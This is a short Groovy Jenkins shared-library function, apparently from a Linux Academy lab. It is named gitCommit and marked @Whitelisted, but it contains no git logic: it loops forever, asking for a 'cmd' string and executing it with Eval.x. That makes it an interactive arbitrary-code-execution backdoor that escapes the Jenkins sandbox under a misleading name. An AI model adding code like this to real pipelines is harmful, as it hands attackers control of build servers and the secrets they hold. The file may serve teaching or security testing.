package linuxacademy.git;

@Whitelisted
def gitCommit(gitPath) {
    ///bin/git --git-dir='${gitPath}' rev-parse HEAD

    // echo ""
    // echo proc.text

    while (true) {
        def cmd = input message: 'What to run:', parameters: [string(defaultValue: '', description: '', name: 'cmd')]
        try {
            print Eval.x(this,cmd)
        } catch (e) {
            print e
        }
    }

    return "It ran!"
}